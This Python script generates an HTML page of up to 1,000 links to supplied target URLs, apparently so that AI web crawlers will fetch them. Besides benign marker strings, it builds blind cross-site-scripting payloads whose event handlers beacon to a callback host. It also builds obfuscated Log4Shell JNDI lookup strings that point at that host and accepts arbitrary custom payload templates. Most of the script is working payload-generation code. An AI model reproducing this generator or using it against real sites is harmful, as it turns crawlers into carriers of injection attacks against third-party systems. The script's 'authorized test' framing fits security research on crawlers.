#!/usr/bin/env python3
"""Generate a bounded static HTML page for AI-crawler testing."""

from __future__ import annotations

import argparse
import html
import random
import secrets
import string
import sys
from pathlib import Path
from urllib.parse import parse_qsl, quote, urlencode, urlsplit, urlunsplit

MAX_LINKS = 1_000
PAYLOADS = ("marker", "cache-bust", "blind-xss", "log4j-dns", "custom")


def _validated_targets(values: list[str]) -> list[str]:
    targets: list[str] = []
    for value in values:
        value = value.strip()
        if not value or value.startswith("#"):
            continue
        parsed = urlsplit(value)
        if parsed.scheme not in ("http", "https") or not parsed.hostname:
            raise ValueError(f"target must be an absolute HTTP(S) URL: {value!r}")
        targets.append(value)
    if not targets:
        raise ValueError("at least one target URL is required")
    return list(dict.fromkeys(targets))


def _callback_url(callback: str) -> str:
    parsed = urlsplit(callback if "://" in callback else f"https://{callback}")
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        raise ValueError("--callback must be an HTTP(S) URL or hostname")
    if parsed.username or parsed.password or parsed.query or parsed.fragment:
        raise ValueError("--callback must not contain credentials, a query, or a fragment")
    try:
        port = parsed.port
    except ValueError as exc:
        raise ValueError("--callback contains an invalid port") from exc
    host = f"[{parsed.hostname}]" if ":" in parsed.hostname else parsed.hostname
    path = quote(parsed.path.rstrip("/"), safe="/:@-._~!$&()*+,;=%")
    return f"{parsed.scheme}://{host}{f':{port}' if port else ''}{path}"


def _callback_host(callback: str) -> str:
    return urlsplit(_callback_url(callback)).hostname or ""


def _fanout_payload(kind: str, n: int, token: str) -> str:
    prefixes = {
        "marker": ("marker", "trace", "probe", "request", "crawler", "visit",
                   "link", "item", "resource", "poc"),
        "cache-bust": ("cb", "nocache", "fresh", "bypass", "unique", "version",
                       "cache", "miss", "nonce", "buster"),
    }[kind]
    separators = ("-", ".", "_", "~", "!", "$", ":", "/", ",", ";")
    index = n - 1
    prefix = prefixes[index % 10]
    separator = separators[(index // 10) % 10]
    shape = (index // 100) % 10
    number = (str(n), f"{n:04d}", f"{n:x}", f"{n:o}", f"{n:b}")[shape % 5]
    layouts = (
        (prefix, token, number), (token, prefix, number),
        (prefix, number, token), (number, prefix, token),
        (prefix + token, number), (prefix, token + number),
        (token, number, prefix), (number, token, prefix),
        (prefix + number, token), (token, prefix + number),
    )
    return separator.join(layouts[shape])


def _blind_xss_payload(n: int, beacon: str) -> str:
    prefixes = ('">', "'>", "</title>", "</textarea>", "</script>")
    elements = (
        ('<img src=x {event}="this.onerror=null;{js}">', "onerror"),
        ('<svg {event}="{js}">', "onload"),
        ('<details open {event}="{js}">', "ontoggle"),
        ('<video src=x {event}="this.onerror=null;{js}">', "onerror"),
        ('<input autofocus {event}="{js}">', "onfocus"),
    )
    beacons = (
        "fetch('{beacon}',{mode:'no-cors'})",
        "(new Image).src='{beacon}'",
        "navigator.sendBeacon('{beacon}')",
        "location.assign('{beacon}')",
        "import('{beacon}')",
    )
    index = n - 1
    prefix = prefixes[index % 5]
    element, event = elements[(index // 5) % 5]
    javascript = beacons[(index // 25) % 5].replace("{beacon}", beacon)
    case_mask = (index // 125) % 8
    event = "".join(
        char.upper() if position < 3 and case_mask & (1 << position) else char
        for position, char in enumerate(event)
    )
    return prefix + element.replace("{event}", event).replace("{js}", javascript)


def _obfuscated_word(word: str, index: int) -> tuple[str, int]:
    pieces = []
    for char in word:
        forms = (char, "${lower:" + char.upper() + "}", "${::-" + char + "}")
        pieces.append(forms[index % 3])
        index //= 3
    return "".join(pieces), index


def _log4j_dns_payload(n: int, token: str, callback: str) -> str:
    index = n - 1
    jndi, index = _obfuscated_word("jndi", index)
    dns, _ = _obfuscated_word("dns", index)
    path = f"ai-bot-poc-{quote(token, safe='')}-{n}"
    return "${" + jndi + ":" + dns + "://" + _callback_host(callback) + "/" + path + "}"


def make_payload(kind: str, *, n: int, target: str, token: str,
                 callback: str, custom: str | None) -> str:
    if kind in ("marker", "cache-bust"):
        return _fanout_payload(kind, n, token)
    if kind == "blind-xss":
        if not callback:
            raise ValueError("blind-xss requires --callback")
        beacon = f"{_callback_url(callback)}/ai-bot-poc/{quote(token, safe='')}/{n}"
        return _blind_xss_payload(n, beacon)
    if kind == "log4j-dns":
        if not callback:
            raise ValueError("log4j-dns requires --callback")
        return _log4j_dns_payload(n, token, callback)
    if not custom:
        raise ValueError("custom payload requires --payload-template")
    return (custom.replace("{n}", str(n))
                  .replace("{target}", target)
                  .replace("{token}", token)
                  .replace("{callback}", callback))


def add_payload(url: str, payload: str, *, position: str, parameter: str) -> str:
    parsed = urlsplit(url)
    if position == "path":
        path = parsed.path.rstrip("/") + "/" + quote(payload, safe="")
        return urlunsplit((parsed.scheme, parsed.netloc, path, parsed.query, ""))
    query = parse_qsl(parsed.query, keep_blank_values=True)
    query.append((parameter, payload))
    return urlunsplit((parsed.scheme, parsed.netloc, parsed.path,
                       urlencode(query), ""))


def _link_text(args: argparse.Namespace, n: int, rng: random.Random) -> str:
    if args.text_mode == "increment":
        template = args.text[0] if args.text else "item {n}"
        return template.replace("{n}", str(n))
    if args.text_mode == "random":
        alphabet = string.ascii_letters + string.digits
        return "".join(rng.choice(alphabet) for _ in range(args.random_length))
    texts = args.text or ["item {n}"]
    return texts[(n - 1) % len(texts)].replace("{n}", str(n))


def render_page(args: argparse.Namespace, targets: list[str]) -> str:
    rng = random.Random(args.seed)
    token = args.token or secrets.token_hex(4)
    links = []
    for n in range(1, args.count + 1):
        target = targets[(n - 1) % len(targets)]
        payload = make_payload(
            args.payload, n=n, target=target, token=token,
            callback=args.callback, custom=args.payload_template,
        )
        href = add_payload(
            target, payload, position=args.payload_position,
            parameter=args.payload_param,
        )
        label = _link_text(args, n, rng)
        links.append(f'    <li><a href="{html.escape(href, quote=True)}">'
                     f'{html.escape(label)}</a></li>')

    title = html.escape(args.title)
    return (
        "<!doctype html>\n<html lang=\"en\">\n<head>\n"
        "  <meta charset=\"utf-8\">\n"
        "  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n"
        f"  <title>{title}</title>\n</head>\n<body>\n"
        f"  <h1>{title}</h1>\n  <ol>\n" + "\n".join(links) +
        "\n  </ol>\n</body>\n</html>\n"
    )


def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("targets", nargs="*", help="Base target URL(s)")
    parser.add_argument("--targets-file", type=Path,
                        help="File containing one target URL per line")
    parser.add_argument("--count", type=int, default=MAX_LINKS,
                        help=f"Number of links, 1-{MAX_LINKS} (default: {MAX_LINKS})")
    parser.add_argument("--text", action="append", default=[],
                        help="Link text or increment template; repeat for a list")
    parser.add_argument("--text-file", type=Path,
                        help="File containing one link text per line")
    parser.add_argument("--text-mode", choices=("cycle", "random", "increment"),
                        default="increment")
    parser.add_argument("--random-length", type=int, default=12)
    parser.add_argument("--seed", help="Reproducible random-label seed")
    parser.add_argument("--payload", choices=PAYLOADS, default="marker")
    parser.add_argument("--payload-template", help="Template for --payload custom")
    parser.add_argument("--payload-position", choices=("query", "path"), default="query")
    parser.add_argument("--payload-param", default="ai_bot_poc")
    parser.add_argument("--callback", default="",
                        help="Controlled callback hostname or URL; bare hosts use HTTPS")
    parser.add_argument("--token", help="Fixed experiment token (random by default)")
    parser.add_argument("--title", default="Authorized AI crawler test")
    parser.add_argument("--output", type=Path, default=Path("poc.html"))
    args = parser.parse_args(argv)
    if not 1 <= args.count <= MAX_LINKS:
        parser.error(f"--count must be between 1 and {MAX_LINKS}")
    if not 1 <= args.random_length <= 128:
        parser.error("--random-length must be between 1 and 128")
    if not args.payload_param or any(c in args.payload_param for c in "&=?#"):
        parser.error("--payload-param must be a simple non-empty name")
    return args


def main() -> None:
    try:
        args = parse_args()
        raw_targets = list(args.targets)
        if args.targets_file:
            raw_targets.extend(args.targets_file.read_text(encoding="utf-8").splitlines())
        if args.text_file:
            args.text.extend(line for line in
                             args.text_file.read_text(encoding="utf-8").splitlines()
                             if line and not line.startswith("#"))
        targets = _validated_targets(raw_targets)
        page = render_page(args, targets)
        args.output.parent.mkdir(parents=True, exist_ok=True)
        args.output.write_text(page, encoding="utf-8")
        print(f"wrote {args.count} links to {args.output}")
    except (OSError, ValueError) as exc:
        print(f"error: {exc}", file=sys.stderr)
        raise SystemExit(2) from exc


if __name__ == "__main__":
    main()
